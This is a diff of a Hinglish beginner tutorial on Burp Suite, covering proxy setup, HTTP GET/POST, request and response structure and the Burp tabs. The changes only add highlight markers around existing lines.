@@ -556,11 +556,11 @@ Burp Suite is an integrated platform and graphical tool for performing security 
 
 ### 🧠 4. Zaroorat Kyun Hai? (Why use it?)
 
-**Problem:**  
-Browser aur server ke beech mein jo traffic hota hai (requests/responses), use normally tum dekh nahi sakte. Jaise tum Google search karte ho, browser directly Google server ko request bhejta hai aur response lata hai. Tumhe pata nahi hota ki exact kya data bheja gaya, kaise bheja gaya. Vulnerabilities dhundhne ke liye ye traffic dekhna aur modify karna zaroori hota hai.
+**[[HL::Problem::HL]]:**  
+[[HL::Browser aur server ke beech mein jo traffic hota hai (requests/responses), use normally tum dekh nahi sakte. Jaise tum Google search karte ho, browser directly Google server ko request bhejta hai aur response lata hai. Tumhe pata nahi hota ki exact kya data bheja gaya, kaise bheja gaya. Vulnerabilities dhundhne ke liye ye traffic dekhna aur modify karna zaroori hota hai.::HL]]
 
-**Solution:**  
-Burp Suite proxy ke roop mein browser aur server ke beech mein baith jata hai. Saara traffic iske through guzarta hai. Tum request dekh sakte ho, rok sakte ho, badal sakte ho, aur dobara bhej sakte ho. Isse tum vulnerabilities ko manually test kar sakte ho.
+[[HL::**Solution:**::HL]]  
+[[HL::Burp Suite proxy ke roop mein browser aur server ke beech mein baith jata hai. Saara traffic iske through guzarta hai. Tum request::HL]] [[HL::dekh sakte ho, rok sakte ho, badal sakte ho, aur dobara bhej sakte ho. Isse tum vulnerabilities ko manually test kar sakte ho::HL]].
 
 ---
 
@@ -575,10 +575,10 @@ Burp Suite proxy ke roop mein browser aur server ke beech mein baith jata hai. S
 
 ### ⚙️ 6. Under the Hood (Technical Working)
 
-- Burp Suite Java-based application hai. Jab tum install karte ho, ye apne saath ek Java runtime bundle kar leta hai (ya system Java use karta hai).
-- Jab tum Burp start karte ho, ye local machine par ek **proxy server** start kar deta hai (usually `127.0.0.1:8080`). Browser ko is proxy ke through traffic bhejne ke liye configure karna padta hai.
-- Burp saara traffic intercept karta hai, usse parse karta hai, aur UI mein dikhata hai. Tum requests ko modify kar ke forward kar sakte ho.
-- Community edition mein Intruder attack ki speed limited hai (thoda slow) aur automated scanner disabled hai, lekin manual testing ke liye sab kuch available hai.
+- [[HL::Burp Suite Java-based application hai. Jab tum install karte ho, ye apne saath ek Java runtime bundle kar leta hai (ya system Java use karta hai).::HL]]
+- [[HL::Jab tum Burp start karte ho, ye local machine par ek **proxy server** start kar deta hai (usually `127.0.0.1:8080`). Browser ko is proxy ke through traffic bhejne ke liye configure karna padta hai::HL]].
+- [[HL::Burp saara traffic intercept karta hai, usse parse karta hai, aur UI mein dikhata hai. Tum requests ko modify kar ke forward kar sakte ho.::HL]]
+- [[HL::Community edition mein Intruder attack ki speed limited hai (thoda slow) aur automated scanner disabled hai, lekin manual testing ke liye sab kuch available hai::HL]].
 
 ---
 
@@ -609,11 +609,11 @@ Burp Suite proxy ke roop mein browser aur server ke beech mein baith jata hai. S
    - "Start Burp" click karo.
 - **Screen:** Burp Suite ka main window khul jayega. Top par tabs dikhenge: **Dashboard, Target, Proxy, Intruder, Repeater, etc.** Ye tumhara workshop hai.
 
-**Step 4: Proxy settings check karo (abhi ke liye bas dekhna hai)**
-- "Proxy" tab par click karo.
-- Phir "Options" sub-tab par click karo.
-- Yahan "Proxy Listeners" section mein ek entry hogi: `127.0.0.1:8080` with "Running" status. Iska matlab Burp ka proxy server chal raha hai.
-- Abhi browser configure nahi kiya, to traffic intercept nahi hoga. Baad mein karenge.
+[[HL::**Step 4: Proxy settings check karo (abhi ke liye bas dekhna hai)**::HL]]
+- [[HL::"Proxy" tab par click karo.::HL]]
+- [[HL::Phir "Options" sub-tab par click karo.::HL]]
+- [[HL::Yahan "Proxy Listeners" section mein ek entry hogi: `127.0.0.1:8080` with "Running" status. Iska matlab Burp ka proxy server chal raha hai.::HL]]
+- [[HL::Abhi browser configure nahi kiya, to traffic intercept nahi hoga. Baad mein karenge::HL]].
 
 ---
 
@@ -660,9 +660,9 @@ Burp Suite proxy ke roop mein browser aur server ke beech mein baith jata hai. S
 
 ### 🌍 11. Real-World Use Case (Bug Bounty / Pentesting)
 
-**Scenario:** Ek bug bounty hunter ne ek website test ki. Usne Burp Suite Community edition use kiya. Proxy enable kiya, browser configure kiya, aur saari requests dekhi. Ek request mein usne dekha ki `id` parameter vulnerable ho sakta hai. Usne request ko Repeater mein bheja, manually payloads try kiye, aur SQL Injection confirm kiya.  
-**Result:** Usne report likhi aur $500 ka bounty mila.  
-**Moral:** Community edition se bhi real bounties earn kiye ja sakte hain.
+[[HL::**Scenario:** Ek bug bounty hunter ne ek website test ki. Usne Burp Suite Community edition use kiya. Proxy enable kiya, browser configure kiya, aur saari requests dekhi. Ek request mein usne dekha ki `id` parameter vulnerable ho sakta hai. Usne request ko Repeater mein bheja, manually payloads try kiye, aur SQL Injection confirm kiya.::HL]]  
+[[HL::**Result:** Usne report likhi aur $500 ka bounty mila.::HL]]  
+[[HL::**Moral:** Community edition se bhi real bounties earn kiye ja sakte hain::HL]].
 
 ---
 
@@ -743,56 +743,56 @@ A5: Browser ki settings mein jaake manual proxy configure karo: address `127.0.0
 
 ### 📖 3. Technical Definition (Interview Answer)
 
-**Standard English Definition:**  
-HTTP methods (or verbs) indicate the desired action to be performed on a resource. The two most common are GET and POST.  
-- **GET** requests data from a specified resource. It appends data to the URL in name/value pairs (query string).  
-- **POST** submits data to be processed to a specified resource. The data is included in the body of the request.
+**[[HL::Standard English Definition::HL]]:**  
+[[HL::HTTP methods (or verbs) indicate the desired action to be performed on a resource. The two most common are GET and POST.::HL]]  
+- [[HL::**GET** requests data from a specified resource. It appends data to the URL in name/value pairs (query string).::HL]]  
+- [[HL::**POST** submits data to be processed to a specified resource. The data is included in the body of the request.::HL]]
 
-**Hinglish Breakdown:**
-- **GET:** Jab tum server se kuch data lena chahte ho (jaise webpage, search results). Data URL ke andar `?` ke baad aata hai, jaise `google.com/search?q=hello`. Yeh data browser history, bookmarks, aur logs mein save ho jata hai.
-- **POST:** Jab tum server ko kuch data bhejna chahte ho (jaise login form, registration form). Data request ke body mein hota hai, URL mein nahi dikhta. Thoda secure hota hai (lekin fully secure nahi, body bhi intercept ho sakti hai).
+**[[HL::Hinglish Breakdown::HL]]:**
+- [[HL::**GET:** Jab tum server se kuch data lena chahte ho (jaise webpage, search results). Data URL ke andar `?` ke baad aata hai, jaise `google.com/search?q=hello`. Yeh data browser history, bookmarks, aur logs mein save ho jata hai.::HL]]
+- [[HL::**POST:** Jab tum server ko kuch data bhejna chahte ho (jaise login form, registration form). Data request ke body mein hota hai, URL mein nahi dikhta. Thoda secure hota hai (lekin fully secure nahi, body bhi intercept ho sakti hai::HL]]).
 
 ---
 
 ### 🧠 4. Zaroorat Kyun Hai? (Why use it?)
 
-**Problem:**  
-Browser ko server ko batana padta hai ki "mujhe kya chahiye" ya "main kya bhej raha hoon". Agar saari requests ek hi tarike ki hoti, to server confuse ho jata. Alag-alag methods ka use karke server samajh leta hai ki ye data lene ka request hai ya data bhejne ka.
+**[[HL::Problem::HL]]:**  
+[[HL::Browser ko server ko batana padta hai ki "mujhe kya chahiye" ya "main kya bhej raha hoon". Agar saari requests ek hi tarike ki hoti, to server confuse ho jata. Alag-alag methods ka use karke server samajh leta hai ki ye data lene ka request hai ya data bhejne ka.::HL]]
 
-**Solution:**  
-GET aur POST (aur other methods like PUT, DELETE) define karte hain ki request ka purpose kya hai. Web developers in methods ka istemal karte hain taaki server sahi tarike se respond kar sake.
+[[HL::**Solution:**::HL]]  
+[[HL::GET aur POST (aur other methods like PUT, DELETE) define karte hain ki request ka purpose kya hai. Web developers in methods ka istemal karte hain taaki server sahi tarike se respond kar sake::HL]].
 
 ---
 
 ### 🔍 5. Visual - Jab Screen Par Kya Dikhega
 
-- **GET request in browser URL:** Jab tum Google search karte ho, URL kuch aisa dikhta hai:  
-  `https://www.google.com/search?q=burp+suite`  
-  Yahan `?` ke baad `q=burp+suite` query parameter hai.
-- **POST request in browser:** Jab tum kisi website par login karte ho, URL mein kuch nahi dikhta. Tum form fill karte ho aur submit karte ho. URL wahi rahta hai (jaise `facebook.com/login`). Data browser ke network tab mein dekh sakte ho.
-- **Burp Suite mein:** Jab intercept on karte ho, GET request aisi dikhegi:  
-  `GET /search?q=hello HTTP/1.1`  
-  POST request:  
-  `POST /login HTTP/1.1`  
-  `...`  
-  `username=admin&password=1234`
+- [[HL::**GET request in browser URL:** Jab tum Google search karte ho, URL kuch aisa dikhta hai:::HL]]  
+  [[HL::`https://www.google.com/search?q=burp+suite`::HL]]  
+  [[HL::Yahan `?` ke baad `q=burp+suite` query parameter hai.::HL]]
+- [[HL::**POST request in browser:** Jab tum kisi website par login karte ho, URL mein kuch nahi dikhta. Tum form fill karte ho aur submit karte ho. URL wahi rahta hai (jaise `facebook.com/login`). Data browser ke network tab mein dekh sakte ho.::HL]]
+- [[HL::**Burp Suite mein:** Jab intercept on karte ho, GET request aisi dikhegi:::HL]]  
+  [[HL::`GET /search?q=hello HTTP/1.1`::HL]]  
+  [[HL::POST request:::HL]]  
+  [[HL::`POST /login HTTP/1.1`::HL]]  
+  [[HL::`...`::HL]]  
+  [[HL::`username=admin&password=1234`::HL]]
 
 ---
 
 ### ⚙️ 6. Under the Hood (Technical Working)
 
-**GET ke liye:**
-1. Browser URL parse karta hai, query string nikalta hai (`?` ke baad ka part).
-2. Browser server ko TCP connection banata hai.
-3. HTTP request bhejta hai: `GET /path?q=value HTTP/1.1` with headers.
-4. Server request padhta hai, query parameters parse karta hai, data fetch karta hai, response bhejta hai.
+**[[HL::GET ke liye::HL]]:**
+1. [[HL::Browser URL parse karta hai, query string nikalta hai (`?` ke baad ka part::HL]]).
+2. [[HL::Browser server ko TCP connection banata hai.::HL]]
+3. [[HL::HTTP request bhejta hai: `GET /path?q=value HTTP/1.1` with headers.::HL]]
+4. [[HL::Server request padhta hai, query parameters parse karta hai, data fetch karta hai, response bhejta hai::HL]].
 
-**POST ke liye:**
-1. Browser form data collect karta hai.
-2. Request line: `POST /path HTTP/1.1`
-3. Headers mein `Content-Type: application/x-www-form-urlencoded` (ya multipart) aur `Content-Length` hota hai.
-4. Blank line ke baad body mein data: `username=admin&password=123`
-5. Server body read karta hai, data process karta hai, response bhejta hai.
+**[[HL::POST ke liye::HL]]:**
+1. [[HL::Browser form data collect karta hai.::HL]]
+2. [[HL::Request line: `POST /path HTTP/1.1`::HL]]
+3. [[HL::Headers mein `Content-Type: application/x-www-form-urlencoded` (ya multipart) aur `Content-Length` hota hai.::HL]]
+4. [[HL::Blank line ke baad body mein data: `username=admin&password=123`::HL]]
+5. [[HL::Server body read karta hai, data process karta hai, response bhejta hai::HL]].
 
 ---
 
@@ -852,8 +852,8 @@ GET aur POST (aur other methods like PUT, DELETE) define karte hain ki request k
 - **"Log sochte hain ki GET sirf data lene ke liye hai, data bhej nahi sakte."**  
   **Actually:** GET mein bhi data bhej sakte ho – URL ke through query parameters. Lekin ye data usually server ko filter karne ke liye hota hai (jaise search term). Large data, sensitive data, ya data jo modify kare, uske liye GET use nahi karte.
 
-- **"Log sochte hain ki POST mein data URL mein kabhi nahi dikhta."**  
-  **Actually:** POST request ka URL bhi hota hai, jaise `login.php`. Lekin jo data tum bhej rahe ho, woh URL mein nahi, body mein hota hai. URL wahi rahta hai.
+- **"[[HL::Log sochte hain ki POST mein data URL mein kabhi nahi dikhta."::HL]]**  
+  [[HL::**Actually:** POST request ka URL bhi hota hai, jaise `login.php`. Lekin jo data tum bhej rahe ho, woh URL mein nahi, body mein hota hai. URL wahi rahta hai::HL]].
 
 - **"Log sochte hain ki HTTP methods sirf GET/POST hain."**  
   **Actually:** Aur bhi methods hain: PUT, DELETE, HEAD, OPTIONS, etc. Lekin beginners ke liye GET aur POST hi important hain.
@@ -1036,13 +1036,13 @@ Content-Length: 1234
 
 ### 💻 7. Hands-On: Step-by-Step Practical
 
-**Step 1: Burp Suite open karo aur proxy enable karo (agar already installed hai)**
-- Burp Suite launch karo, temporary project create karo.
-- Proxy tab → Intercept sub-tab par jao. Ensure "Intercept is on" button dikh raha hai (agar off hai to click kar ke on karo).
+[[HL::**Step 1: Burp Suite open karo aur proxy enable karo (agar already installed hai)**::HL]]
+- [[HL::Burp Suite launch karo, temporary project create karo.::HL]]
+- [[HL::Proxy tab → Intercept sub-tab par jao. Ensure "Intercept is on" button dikh raha hai (agar off hai to click kar ke on karo::HL]]).
 
-**Step 2: Browser proxy configure karo (Module 3 mein detail, abhi basic)**
-- Firefox ya Chrome mein proxy settings mein jaake manual proxy set karo: HTTP Proxy = `127.0.0.1`, Port = `8080`, aur "Also use this proxy for HTTPS" check karo.
-- Burp Suite mein Proxy → Intercept mein "Intercept is on" hai to saari requests rukengi.
+**[[HL::Step 2: Browser proxy configure karo (Module 3 mein detail, abhi basic::HL]])**
+- [[HL::Firefox ya Chrome mein proxy settings mein jaake manual proxy set karo: HTTP Proxy = `127.0.0.1`, Port = `8080`, aur "Also use this proxy for HTTPS" check karo.::HL]]
+- [[HL::Burp Suite mein Proxy → Intercept mein "Intercept is on" hai to saari requests rukengi::HL]].
 
 **Step 3: DVWA ya kisi bhi HTTP site par request bhejo**
 - Browser mein `localhost/dvwa/login.php` open karo (agar DVWA installed hai). Ya `http://example.com` bhi chalega.
@@ -1093,15 +1093,15 @@ Content-Length: 1234
 - **Mistake 3:** Status codes na samajhna.  
   **Fix:** 200 = OK, 301/302 = Redirect, 400 = Bad Request, 401 = Unauthorized, 403 = Forbidden, 404 = Not Found, 500 = Internal Server Error. Inhe yaad rakho.
 
-- **Mistake 4:** Response body ko HTML hi samajh lena.  
-  **Fix:** Response body JSON, XML, image, file kuch bhi ho sakta hai. `Content-Type` header dekho.
+- [[HL::**Mistake 4:** Response body ko HTML hi samajh lena.::HL]]  
+  [[HL::**Fix:** Response body JSON, XML, image, file kuch bhi ho sakta hai. `Content-Type` header dekho::HL]].
 
 ---
 
 ### 🤔 10. Agar Dimag Ghoom Rahe Hai? (Confusion Clarifier)
 
-- **"Log sochte hain ki request aur response ek hi connection mein aate hain."**  
-  **Actually:** Haan, generally ek TCP connection mein request bheji jaati hai, response aata hai, phir connection close ho sakta hai (ya keep-alive). HTTP/1.1 mein persistent connections bhi hote hain.
+- **"[[HL::Log sochte hain ki request aur response ek hi connection mein aate hain."::HL]]**  
+  [[HL::**Actually:** Haan, generally ek TCP connection mein request bheji jaati hai, response aata hai, phir connection close ho sakta hai (ya keep-alive). HTTP/1.1 mein persistent connections bhi hote hain::HL]].
 
 - **"Log sochte hain ki headers optional hain."**  
   **Actually:** Kuch headers zaroori hote hain, jaise `Host` HTTP/1.1 mein mandatory hai. Baaki optional hain, lekin browser automatically bahut saare headers bhejta hai.
@@ -1113,9 +1113,9 @@ Content-Length: 1234
 
 ### 🌍 11. Real-World Use Case (Bug Bounty / Pentesting)
 
-**Scenario:** Ek website par login form tha. Pentester ne request intercept ki aur dekha ki response mein `Set-Cookie` header aa raha tha jisme `HttpOnly` flag missing tha. Iska matlab cookie JavaScript accessible thi, jo XSS attack mein cookie steal karne ka kaam aa sakti thi.  
-**Result:** Usne report kiya, bounty mila.  
-**Lesson:** Headers mein chhoti-chhoti chizein bhi vulnerable ho sakti hain.
+[[HL::**Scenario:** Ek website par login form tha. Pentester ne request intercept ki aur dekha ki response mein `Set-Cookie` header aa raha tha jisme `HttpOnly` flag missing tha. Iska matlab cookie JavaScript accessible thi, jo XSS attack mein cookie steal karne ka kaam aa sakti thi.::HL]]  
+[[HL::**Result:** Usne report kiya, bounty mila.::HL]]  
+[[HL::**Lesson:** Headers mein chhoti-chhoti chizein bhi vulnerable ho sakti hain::HL]].
 
 ---
 
@@ -1139,10 +1139,10 @@ Content-Length: 1234
 
 ### 🛠️ 13. Best Practices (Pro Tips)
 
-- **Burp history save karo:** Project save kar ke rakho, taaki baad mein review kar sako.
-- **Search in history:** Burp mein search functionality hai (Ctrl+F) – specific parameters, headers, ya responses dhundh sakte ho.
-- **Comments add karo:** Interesting requests par right-click → "Add comment" se notes daal sakte ho.
-- **Compare requests:** Do requests select kar ke right-click → "Send to Comparer" se differences dekh sakte ho.
+- [[HL::**Burp history save karo:** Project save kar ke rakho, taaki baad mein review kar sako.::HL]]
+- [[HL::**Search in history:** Burp mein search functionality hai (Ctrl+F) – specific parameters, headers, ya responses dhundh sakte ho.::HL]]
+- [[HL::**Comments add karo:** Interesting requests par right-click → "Add comment" se notes daal sakte ho.::HL]]
+- [[HL::**Compare requests:** Do requests select kar ke right-click → "Send to Comparer" se differences dekh sakte ho::HL]].
 
 ---
 
@@ -1239,95 +1239,95 @@ Burp Suite is an integrated platform for web application security testing. Its i
 
 ### 🧠 4. Zaroorat Kyun Hai? (Why use it?)
 
-**Problem:**  
-Web application testing mein bahut saare alag-alag tasks karne padte hain – traffic dekhna, requests modify karna, brute force lagana, tokens check karna, data encode/decode karna, etc. Agar har task ke liye alag tool use karo, to time waste, compatibility issues, aur confusion badhegi.
+**[[HL::Problem::HL]]:**  
+[[HL::Web application testing mein bahut saare alag-alag tasks karne padte hain – traffic dekhna, requests modify karna, brute force lagana, tokens check karna, data encode/decode karna, etc. Agar har task ke liye alag tool use karo, to time waste, compatibility issues, aur confusion badhegi.::HL]]
 
-**Solution:**  
-Burp Suite sab tools ek hi jagah laata hai. Tabs organize kiye gaye hain taaki ek seamless workflow ho. Tum Proxy se request intercept karo, Intruder mein bhejo brute force ke liye, response Repeater mein verify karo, aur Decoder mein data encode karo – sab ek hi window mein, bina kisi hassle ke.
+[[HL::**Solution:**::HL]]  
+[[HL::Burp Suite sab tools ek hi jagah laata hai. Tabs organize kiye gaye hain taaki ek seamless workflow ho. Tum Proxy se request intercept karo, Intruder mein bhejo brute force ke liye, response Repeater mein verify karo, aur Decoder mein data encode karo – sab ek hi window mein, bina kisi hassle ke::HL]].
 
 ---
 
 ### 🔍 5. Visual - Jab Screen Par Kya Dikhega
 
-**Location:** Burp Suite open karne ke baad, top par ek row of tabs dikhegi. Sequence kuch aisa hoga (depending on version):
+[[HL::**Location:** Burp Suite open karne ke baad, top par ek row of tabs dikhegi. Sequence kuch aisa hoga (depending on version):::HL]]
 
 ```
-[Dashboard] [Target] [Proxy] [Intruder] [Repeater] [Sequencer] [Decoder] [Comparer] [Logger] [Extender] [User Options]
+[[HL::[Dashboard] [Target] [Proxy] [Intruder] [Repeater] [Sequencer] [Decoder] [Comparer] [Logger] [Extender] [User Options]::HL]]
 ```
 
-- **Har tab par click karte hi** us tool ka interface khul jata hai, jisme further sub-tabs ya options hote hain.
-- **Example:** Proxy tab par click karoge to andar "Intercept", "HTTP history", "WebSockets history", "Options" jaise sub-tabs dikhenge.
-- **Community edition mein** Intruder ke aage ek (rate limited) hint ho sakti hai, ya Scanner tab nahi dikhta.
+- [[HL::**Har tab par click karte hi** us tool ka interface khul jata hai, jisme further sub-tabs ya options hote hain.::HL]]
+- [[HL::**Example:** Proxy tab par click karoge to andar "Intercept", "HTTP history", "WebSockets history", "Options" jaise sub-tabs dikhenge.::HL]]
+- [[HL::**Community edition mein** Intruder ke aage ek (rate limited) hint ho sakti hai, ya Scanner tab nahi dikhta.::HL]]
 
-**Appearance:** Modern, clean UI, dark theme default (change kar sakte ho). Har tab ke andar data tables, buttons, aur input fields hote hain.
+[[HL::**Appearance:** Modern, clean UI, dark theme default (change kar sakte ho). Har tab ke andar data tables, buttons, aur input fields hote hain::HL]].
 
 ---
 
 ### ⚙️ 6. Under the Hood (Technical Working)
 
-Har tab internally Burp Suite ke core engine se juda hai:
-- **Proxy:** Local server socket (127.0.0.1:8080) par listen karta hai, browser se aane wale TCP connections accept karta hai, HTTP messages parse karta hai, aur user ko display karta hai.
-- **Target:** Proxy se guzre requests ka tree structure build karta hai (sitemap). Scope settings maintain karta hai.
-- **Intruder:** User-defined payload lists aur attack types ke hisaab se multiple HTTP requests generate karta hai, thread pool manage karta hai.
-- **Repeater:** Ek request ko manually edit kar ke bhejta hai, response dikhata hai, aur history maintain karta hai.
-- **Sequencer:** Tokens collect karta hai, statistical analysis karta hai (chi-square, etc.) to check randomness.
-- **Decoder:** Various encoding/decoding algorithms apply karta hai (Base64, URL, HTML, etc.).
-- **Comparer:** Two strings ya byte arrays ko side-by-side dikhata hai, differences highlight karta hai.
-- **Logger:** Burp ke through hone wale saare HTTP traffic ka log rakhta hai (internal).
-- **Extender:** Java API provide karta hai, jisse third-party extensions load aur run ho sakte hain (Python, Ruby, etc. via Jython/JRuby).
-- **User Options:** Configuration files read/write karta hai, settings persist karta hai.
+[[HL::Har tab internally Burp Suite ke core engine se juda hai:::HL]]
+- [[HL::**Proxy:** Local server socket (127.0.0.1:8080) par listen karta hai, browser se aane wale TCP connections accept karta hai, HTTP messages parse karta hai, aur user ko display karta hai.::HL]]
+- [[HL::**Target:** Proxy se guzre requests ka tree structure build karta hai (sitemap). Scope settings maintain karta hai.::HL]]
+- [[HL::**Intruder:** User-defined payload lists aur attack types ke hisaab se multiple HTTP requests generate karta hai, thread pool manage karta hai.::HL]]
+- [[HL::**Repeater:** Ek request ko manually edit kar ke bhejta hai, response dikhata hai, aur history maintain karta hai.::HL]]
+- [[HL::**Sequencer:** Tokens collect karta hai, statistical analysis karta hai (chi-square, etc.) to check randomness.::HL]]
+- [[HL::**Decoder:** Various encoding/decoding algorithms apply karta hai (Base64, URL, HTML, etc::HL]].).
+- [[HL::**Comparer:** Two strings ya byte arrays ko side-by-side dikhata hai, differences highlight karta hai.::HL]]
+- [[HL::**Logger:** Burp ke through hone wale saare HTTP traffic ka log rakhta hai (internal).::HL]]
+- [[HL::**Extender:** Java API provide karta hai, jisse third-party extensions load aur run ho sakte hain (Python, Ruby, etc. via Jython/JRuby).::HL]]
+- [[HL::**User Options:** Configuration files read/write karta hai, settings persist karta hai::HL]].
 
 ---
 
 ### 💻 7. Hands-On: Step-by-Step Practical
 
-**Step 1: Burp Suite open karo**
-- Burp Suite Community launch karo, temporary project banao, use Burp defaults.
+[[HL::**Step 1: Burp Suite open karo**::HL]]
+- [[HL::Burp Suite Community launch karo, temporary project banao, use Burp defaults.::HL]]
 
-**Step 2: Dashboard tab explore karo**
-- Dashboard par click karo.
-- **Screen:** Do main sections – "Tasks" aur "Event Log". Community edition mein tasks limited hain (manual tasks). "Issue Activity" mein manually发现的 vulnerabilities note kar sakte ho.
-- Kuch click karo, explore karo.
+[[HL::**Step 2: Dashboard tab explore karo**::HL]]
+- [[HL::Dashboard par click karo.::HL]]
+- [[HL::**Screen:** Do main sections – "Tasks" aur "Event Log". Community edition mein tasks limited hain (manual tasks). "Issue Activity" mein manually发现的 vulnerabilities note kar sakte ho.::HL]]
+- [[HL::Kuch click karo, explore karo.::HL]]
 
-**Step 3: Target tab explore karo**
-- Target tab par click karo.
-- **Screen:** "Site map" sub-tab – yahan kuch nahi dikhega abhi kyunki koi traffic nahi kiya. "Scope" sub-tab – yahan define kar sakte ho ki kis site par test karna hai.
+[[HL::**Step 3: Target tab explore karo**::HL]]
+- [[HL::Target tab par click karo.::HL]]
+- [[HL::**Screen:** "Site map" sub-tab – yahan kuch nahi dikhega abhi kyunki koi traffic nahi kiya. "Scope" sub-tab – yahan define kar sakte ho ki kis site par test karna hai.::HL]]
 
-**Step 4: Proxy tab explore karo**
-- Proxy tab par click karo.
-- **Screen:** "Intercept" sub-tab – yahan "Intercept is on" button hoga. Iske neeche ek blank area jahan intercepted requests dikhengi. "HTTP history" – baad mein requests ka log dikhega. "Options" – proxy settings (port, etc.).
+[[HL::**Step 4: Proxy tab explore karo**::HL]]
+- [[HL::Proxy tab par click karo.::HL]]
+- [[HL::**Screen:** "Intercept" sub-tab – yahan "Intercept is on" button hoga. Iske neeche ek blank area jahan intercepted requests dikhengi. "HTTP history" – baad mein requests ka log dikhega. "Options" – proxy settings (port, etc.).::HL]]
 
-**Step 5: Intruder tab explore karo**
-- Intruder tab par click karo.
-- **Screen:** Chaar sub-tabs: "Target", "Positions", "Payloads", "Options". Abhi sab blank hoga kyunki koi attack configure nahi kiya. Bas dekh lo layout.
+[[HL::**Step 5: Intruder tab explore karo**::HL]]
+- [[HL::Intruder tab par click karo.::HL]]
+- [[HL::**Screen:** Chaar sub-tabs: "Target", "Positions", "Payloads", "Options". Abhi sab blank hoga kyunki koi attack configure nahi kiya. Bas dekh lo layout.::HL]]
 
-**Step 6: Repeater tab explore karo**
-- Repeater tab par click karo.
-- **Screen:** Left side request pane, right side response pane. Upar "Send" button. Neeche history. Abhi blank.
+[[HL::**Step 6: Repeater tab explore karo**::HL]]
+- [[HL::Repeater tab par click karo.::HL]]
+- [[HL::**Screen:** Left side request pane, right side response pane. Upar "Send" button. Neeche history. Abhi blank.::HL]]
 
-**Step 7: Sequencer tab explore karo**
-- Sequencer tab par click karo.
-- **Screen:** "Live capture" aur "Manual load" options. Token randomness check karne ke liye.
+[[HL::**Step 7: Sequencer tab explore karo**::HL]]
+- [[HL::Sequencer tab par click karo.::HL]]
+- [[HL::**Screen:** "Live capture" aur "Manual load" options. Token randomness check karne ke liye::HL]].
 
-**Step 8: Decoder tab explore karo**
-- Decoder tab par click karo.
-- **Screen:** Ek input area, "Encode as..." aur "Decode as..." dropdowns. Smart decode bhi hai. Kuch type karo jaise "Hello", phir "Encode as" → "Base64" select karo – encoded value dikhegi. Phir "Decode as" → "Base64" select karo – wapas "Hello" aayega.
+[[HL::**Step 8: Decoder tab explore karo**::HL]]
+- [[HL::Decoder tab par click karo.::HL]]
+- [[HL::**Screen:** Ek input area, "Encode as..." aur "Decode as..." dropdowns. Smart decode bhi hai. Kuch type karo jaise "Hello", phir "Encode as" → "Base64" select karo – encoded value dikhegi. Phir "Decode as" → "Base64" select karo – wapas "Hello" aayega::HL]].
 
-**Step 9: Comparer tab explore karo**
-- Comparer tab par click karo.
-- **Screen:** Do boxes – "Load..." buttons se text load kar sakte ho. Phir "Compare" button se differences dekh sakte ho.
+[[HL::**Step 9: Comparer tab explore karo**::HL]]
+- [[HL::Comparer tab par click karo.::HL]]
+- [[HL::**Screen:** Do boxes – "Load..." buttons se text load kar sakte ho. Phir "Compare" button se differences dekh sakte ho.::HL]]
 
-**Step 10: Logger tab explore karo**
-- Logger tab par click karo.
-- **Screen:** Ek table jisme saare requests/responses ka log hoga (jo Burp ke through hue). Abhi kuch nahi dikhega.
+[[HL::**Step 10: Logger tab explore karo**::HL]]
+- [[HL::Logger tab par click karo.::HL]]
+- [[HL::**Screen:** Ek table jisme saare requests/responses ka log hoga (jo Burp ke through hue). Abhi kuch nahi dikhega.::HL]]
 
-**Step 11: Extender tab explore karo**
-- Extender tab par click karo.
-- **Screen:** "BApp Store" sub-tab – yahan se extensions install kar sakte ho (Python, etc.). "APIs" aur "Options" bhi hain.
+[[HL::**Step 11: Extender tab explore karo**::HL]]
+- [[HL::Extender tab par click karo.::HL]]
+- [[HL::**Screen:** "BApp Store" sub-tab – yahan se extensions install kar sakte ho (Python, etc.). "APIs" aur "Options" bhi hain.::HL]]
 
-**Step 12: User Options tab explore karo**
-- User Options tab par click karo.
-- **Screen:** Connections, SSL, Display (theme change kar sakte ho), Misc settings. Theme change kar ke dekho (e.g., Light mode).
+[[HL::**Step 12: User Options tab explore karo**::HL]]
+- [[HL::User Options tab par click karo.::HL]]
+- [[HL::**Screen:** Connections, SSL, Display (theme change kar sakte ho), Misc settings. Theme change kar ke dekho (e.g., Light mode::HL]]).
 
 ---
 
@@ -1359,23 +1359,23 @@ Har tab internally Burp Suite ke core engine se juda hai:
 - **Mistake 1:** Dashboard ko ignore karna.  
   **Fix:** Dashboard tumhe issues track karne deta hai. Manual testing ke baad yahan notes add kar sakte ho.
 
-- **Mistake 2:** Target tab ka scope set nahi karna, jiski wajah se unwanted sites bhi log ho jati hain.  
-  **Fix:** Target → Scope mein "Add" kar ke sirf apni target domain daalo. Phir Proxy options mein "Force use of TLS" waghera set karo.
+- [[HL::**Mistake 2:** Target tab ka scope set nahi karna, jiski wajah se unwanted sites bhi log ho jati hain.::HL]]  
+  [[HL::**Fix:** Target → Scope mein "Add" kar ke sirf apni target domain daalo. Phir Proxy options mein "Force use of TLS" waghera set karo::HL]].
 
-- **Mistake 3:** Proxy history clear na karna, bahut saari requests accumulate ho jati hain.  
-  **Fix:** Baar-baar clear karo ya filter use karo.
+- [[HL::**Mistake 3:** Proxy history clear na karna, bahut saari requests accumulate ho jati hain.::HL]]  
+  [[HL::**Fix:** Baar-baar clear karo ya filter use karo::HL]].
 
-- **Mistake 4:** Extender se extensions install karte waqt Java version mismatch.  
-  **Fix:** Ensure tumhari Java version compatible hai. Burp apna Java bundle karta hai, to generally theek hai.
+- [[HL::**Mistake 4:** Extender se extensions install karte waqt Java version mismatch.::HL]]  
+  [[HL::**Fix:** Ensure tumhari Java version compatible hai. Burp apna Java bundle karta hai, to generally theek hai::HL]].
 
 - **Mistake 5:** Decoder mein smart decode par depend rehna, jabki manual decode bhi seekhna chahiye.  
   **Fix:** Smart decode helpful hai, lekin manual encoding/decoding samjho.
 
-- **Mistake 6:** Logger tab ko overlook karna.  
-  **Fix:** Logger internal traffic dikhata hai jo HTTP history mein nahi aata (e.g., Burp Extender ke calls). Useful for debugging.
+- [[HL::**Mistake 6:** Logger tab ko overlook karna.::HL]]  
+  [[HL::**Fix:** Logger internal traffic dikhata hai jo HTTP history mein nahi aata (e.g., Burp Extender ke calls). Useful for debugging::HL]].
 
-- **Mistake 7:** Comparer ka use na karna.  
-  **Fix:** Do similar responses mein differences dhundhne ke liye Comparer best hai.
+- [[HL::**Mistake 7:** Comparer ka use na karna.::HL]]  
+  [[HL::**Fix:** Do similar responses mein differences dhundhne ke liye Comparer best hai::HL]].
 
 ---
 
@@ -1397,9 +1397,9 @@ Har tab internally Burp Suite ke core engine se juda hai:
